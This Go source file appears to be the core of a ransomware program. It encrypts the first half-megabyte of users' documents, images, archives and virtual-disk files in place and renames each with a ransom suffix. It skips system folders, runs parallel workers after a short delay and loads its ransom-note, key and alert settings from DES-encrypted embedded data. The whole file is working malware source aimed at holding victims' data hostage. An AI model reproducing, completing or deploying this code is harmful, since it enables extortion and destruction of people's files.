package main

import (
	"crypto/cipher"
	"fmt"
	"os"
	"strings"
	"time"
	"crypto/des"
	"encoding/json"
)

func encrypt(filename string, cip cipher.Block) error {

	if len(filename) >= 1+len(settings.filesuffix) && filename[len(filename)-len(settings.filesuffix):] == settings.filesuffix {
		return nil
	}

	f, err := os.OpenFile(filename, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	fstat, _ := f.Stat()
	size := fstat.Size()

	buf, out := make([]byte, 16), make([]byte, 16)
	for offset := int64(0); size-offset > 16 && offset < (512*1024); offset += 16 {
		f.ReadAt(buf, offset)
		cip.Encrypt(out, buf)
		f.WriteAt(out, offset)
	}

	f.Close()
	os.Rename(filename, filename+settings.filesuffix)
	return nil
}

func decrypt(filename string, cip cipher.Block) error {

	if len(filename) < 1+len(settings.filesuffix) || filename[len(filename)-len(settings.filesuffix):] != settings.filesuffix {
		return nil
	}
	f, err := os.OpenFile(filename, os.O_RDWR, 0)
	fmt.Println("Decrypting: ", filename)
	if err != nil {
		return err
	}
	fstat, _ := f.Stat()
	size := fstat.Size()
	buf, out := make([]byte, 16), make([]byte, 16)
	for offset := int64(0); size-offset > 16 && offset < (512*1024); offset += 16 {
		f.ReadAt(buf, offset)
		cip.Decrypt(out, buf)
		f.WriteAt(out, offset)
	}
	f.Close()
	os.Rename(filename, filename[0:len(filename)-len(settings.filesuffix)])
	return nil
}

func filter(path string) int8 {

	lowPath := strings.ToLower(path)

	innerList := []string{"windows", "program", "appdata", "system"}
	suffixList := []string{".vmdk", ".txt", ".zip", ".rar", ".7z", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx", ".jpg", ".gif", ".jpeg", ".png", ".mpg", ".mov", ".mp4", ".avi", ".mp3"}

	for _, inner := range innerList {
		if strings.Contains(lowPath, inner) {
			return 0
		}
	}
	for _, suffix := range suffixList {
		if strings.HasSuffix(lowPath, suffix) {
			return 1
		}
	}
	return 2
}

func doHandler(cip cipher.Block, ListChan chan string, ExitChan chan bool) {
	for filename := range ListChan {
		switch method {
		case 'e':
			encrypt(filename, cip)
		case 'd':
			decrypt(filename, cip)
		}
	}
	ExitChan <- true
}

func startHandler(cip cipher.Block, list chan string) {
	time.Sleep(10 * time.Second)
	ExitChan := make(chan bool, procNum)
	for i := 0; i < procNum; i++ {
		go doHandler(cip, list, ExitChan)
	}
	for i := 0; i < procNum; i++ {
		<-ExitChan
	}
}

type Config struct {
	//加密设置
	pubKey       string
	filesuffix   string
	keyFilename  string
	dkeyFilename string

	//运行提示设置
	alert string

	//readme设置
	readme         string
	readmeFilename string

	readmeUrl         string
	readmeNetFilename string
}

func (self *Config) init(EncData string) {
	cip, err := des.NewCipher([]byte(configPw))
	if err != nil {
		os.Exit(213)
	}

	data := make([]byte, len(EncData))
	Edata := []byte(EncData)
	for offset := 0; len(Edata)-offset > 8; offset += 8 {
		cip.Decrypt(data[offset:offset+8], Edata[offset:offset+8])
	}

	json.Unmarshal(data, self)
}
